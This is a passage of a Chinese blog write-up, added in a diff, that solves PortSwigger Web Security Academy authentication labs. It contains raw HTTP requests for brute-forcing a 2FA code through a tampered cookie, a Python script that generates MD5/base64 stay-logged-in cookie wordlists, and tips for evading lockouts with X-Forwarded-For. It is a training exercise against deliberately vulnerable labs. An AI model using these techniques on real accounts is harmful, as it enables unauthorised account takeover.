+<li>实际上，连续 <code>4</code> 次登录错误，就能返回不一样的错误提示了</li>
+</ul>
+</li>
+<li>找到用户名后，再进行爆破操作</li>
+</ul>
+<p>至于题目提到的逻辑错误，可能是实际上并没有进行锁定操作：只是锁了特定账户的登录请求，没有把 IP 拉黑。</p>
+<h3 id="2-8-Lab-2FA-broken-logic"><a href="#2-8-Lab-2FA-broken-logic" class="headerlink" title="2.8 Lab: 2FA broken logic"></a>2.8 Lab: 2FA broken logic</h3><blockquote>
+<p>This lab’s two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos’s account page.</p>
+<ul>
+<li>Your credentials: <code>wiener:peter</code></li>
+<li>Victim’s username: <code>carlos</code></li>
+</ul>
+<p>You also have access to the email server to receive your 2FA verification code.</p>
+</blockquote>
+<p>没有 <code>carlos</code> 的密码，还要进入 <code>carlos</code> 的个人页面。使用 <code>wiener:peter</code> 登录，发现 Cookie 中存在用户名 <code>verify=wiener</code>，尝试拦截修改：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login2</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a7400d004c776f184baf523008f00a2.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>verify=carlos; session=AVkjrdtFfjUPyWhw1GzhJD94Th6NwVd9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0a7400d004c776f184baf523008f00a2.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0a7400d004c776f184baf523008f00a2.web-security-academy.net/login2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">mfa-code</span><span class="operator">=</span><span class="number">0147</span></span></span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>wiener</code> 的验证码进行登录，提示 <code>Incorrect security code</code>，然后使用 Burp Intruder 进行爆破，<code>4</code> 位的验证码，爆破了 <code>10000</code> 次，这个方法还是不行，似乎仅仅更改 Cookie 中的用户名是不行的。</p>
+<p>查看答案之后，才发现需要先触发生成验证码的逻辑，才可以进行爆破！</p>
+<p>1）访问 <code>/login2</code> 触发验证码生成逻辑</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login2</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a7400d004c776f184baf523008f00a2.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>verify=carlos; session=7nDLAdrE0KYv7CNMU9DCYGk0HcmNw725</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0a7400d004c776f184baf523008f00a2.web-security-academy.net/login</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+<p>2）注意服务器返回的 Response Header，里面有个 Cookie，在 Intruder 中更新一下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=J6wSwjPqdYfgNs6563iQAUwCE6KcZ2Eq; Secure; HttpOnly; SameSite=None</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3012</span><br></pre></td></tr></table></figure>
+
+<p>3）爆破验证码</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login2</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a7400d004c776f184baf523008f00a2.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>verify=carlos; session=J6wSwjPqdYfgNs6563iQAUwCE6KcZ2Eq</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0a7400d004c776f184baf523008f00a2.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0a7400d004c776f184baf523008f00a2.web-security-academy.net/login2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">mfa-code</span><span class="operator">=</span><span class="number">0000</span></span></span><br></pre></td></tr></table></figure>
+
+<p>4）可以根据 HTTP 状态码 <code>302</code> 或者 <code>Length</code> 来确认是否已经成功爆破，OK 之后停止 Intruder 继续发包，然后在 Intruder 中选中对应的发包记录，弹出右键菜单后依次选择 <code>Request in browser</code>、<code>In original session</code>，然后复制生成的 URL 并在浏览器中访问即可。</p>
+<p><img src="/images/burp-suite-intruder-request-in-browser.png" alt="Burp Suite Intruder Request in browser"></p>
+<h3 id="2-9-Lab-Brute-forcing-a-stay-logged-in-cookie"><a href="#2-9-Lab-Brute-forcing-a-stay-logged-in-cookie" class="headerlink" title="2.9 Lab: Brute-forcing a stay-logged-in cookie"></a>2.9 Lab: Brute-forcing a stay-logged-in cookie</h3><blockquote>
+<p>This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.</p>
+<p>To solve the lab, brute-force Carlos’s cookie to gain access to his <strong>My account</strong> page.</p>
+<ul>
+<li>Your credentials: <code>wiener:peter</code></li>
+<li>Victim’s username: <code>carlos</code></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+</blockquote>
+<p>使用 <code>wiener</code> 登陆时，选择保持登录，登陆后看到 Cookie 如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw</span><br></pre></td></tr></table></figure>
+
+<p>进行 Base64 解码得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wiener:51dc30ddc473d43a6011e9ebba6ca770</span><br></pre></td></tr></table></figure>
+
+<p><code>51dc30ddc473d43a6011e9ebba6ca770</code> 即密码 <code>peter</code> 的 MD5 哈希值。</p>
+<p>弄清楚 Cookie 的格式之后，还需要观察一下正常 Cookie 和异常 Cookie 访问页面后的不同响应，以方便我们快速确认正确的密码是哪个！</p>
+<ul>
+<li>正确的 Cookie，返回 HTTP 状态码 <code>200</code></li>
+<li>错误的 Cookie，返回 HTTP 状态码 <code>302</code></li>
+</ul>
+<p>接下来，先使用 Python 对密码进行处理以生成 Cookie 字典：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_dict</span>(<span class="params">pwdfile</span>):</span><br><span class="line">    lines = <span class="built_in">open</span>(pwdfile, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">    fout = <span class="built_in">open</span>(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        line = line.strip().encode()</span><br><span class="line">        line = <span class="string">b&#x27;carlos:%s&#x27;</span> % hashlib.md5(line).hexdigest().encode()</span><br><span class="line">        fout.write(<span class="string">&#x27;%s\n&#x27;</span> % base64.b64encode(line).decode())</span><br><span class="line">    fout.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    gen_dict(<span class="string">&#x27;password.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以在 Burp Intruder 中进行爆破操作了：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/my-account?id=carlos</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a3e00b7041860a480ef30ad000d0081.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>stay-logged-in=Y2FybG9zOmIzNmQzMzE0NTFhNjFlYjJkNzY4NjBlMDBjMzQ3Mzk2</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>最终的密码是：<code>1234567890</code>。</p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li>根据登录时给出的错误提示信息判断用户名、密码的状态<ul>
+<li>不管返回的错误提示是什么，都可以尝试对比下不同请求返回的结果</li>
+<li>使用 Burp Intruder 进行爆破操作，注意不同的攻击类型之间的差异和使用场景</li>
+<li>爆破时，可能会拉黑 IP 地址，可以尝试使用 <code>X-Forwarded-For</code> 来绕过</li>
+</ul>
+</li>
+<li>根据登录时的 HTTP 请求响应时间来判断表单字段可能的值<ul>
+<li>存在&#x2F;不存在的值，响应的时间可能不一样</li>
+<li>响应时间可能被多种因素影响，因此要进行多次测试</li>
+<li>默认的发包模式是 <code>10</code> 个并发请求，且两个包之间没有时间间隔，这可能给响应时间带来影响，可以尝试调整这个发包策略</li>
+</ul>
+</li>
+<li>连续登录失败次数限制绕过<ul>
+<li>在触发限制前，可以使用正确的用户名、密码登录一次，以重置连续失败次数</li>
+<li>默认的发包模式是 <code>10</code> 个并发请求，可能干扰爆破思路，可以将并发模式改为 <code>1</code></li>
+</ul>
+</li>
+<li>思路要放宽，尝试任何可能性，不要拘泥于特定思路<ul>
+<li>能不能直接访问指定 URI</li>
+<li>爆破验证码时，确认有没有先触发验证码生成逻辑</li>
+</ul>
+</li>
+<li>关注 POST 表单中的隐藏字段</li>
+<li>Burp Intruder 的不同攻击模式<ul>
+<li>Sniper</li>
+<li>Battering ram</li>
+<li>Pitchfork</li>
+<li>Cluster bomb</li>
+</ul>
+</li>
+<li>Burp Intruder <code>Request in browser</code></li>
+<li>Cookie 过于简单很容易被爆破</li>
+</ul>
+<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#access-control-vulnerabilities">https://portswigger.net/web-security/all-labs#access-control-vulnerabilities</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Burp/" rel="tag"># Burp</a>
+              <a href="/tags/Authentication/" rel="tag"># Authentication</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/01/11/burp-web-academy-access-control-vulnerabilities-part3/" rel="prev" title="Burp Web Academy 访问控制漏洞（三）">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy 访问控制漏洞（三）
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
